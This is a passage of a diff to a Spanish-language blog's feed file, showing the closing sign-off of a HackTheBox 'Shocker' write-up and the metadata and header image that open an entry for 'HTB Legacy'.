+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;¡Hemos logrado completar la máquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Shocker&lt;/code&gt; de HackTheBox!&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/shocker/05-finish.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>Bast1ant1c</name></author><category term="Writeup" /><category term="Shocker" /><summary type="html">Vamos a resolver la máquina Shocker de HackTheBox. ¡Let's hack!</summary></entry><entry><title type="html">HTB Legacy</title><link href="http://localhost:4000/legacy/" rel="alternate" type="text/html" title="HTB Legacy" /><published>2022-08-17T00:00:00-05:00</published><updated>2022-08-17T00:00:00-05:00</updated><id>http://localhost:4000/legacy</id><content type="html" xml:base="http://localhost:4000/legacy/">&lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/legacy/02-tarjeta.png&quot; /&gt;
 &lt;/p&gt;
 
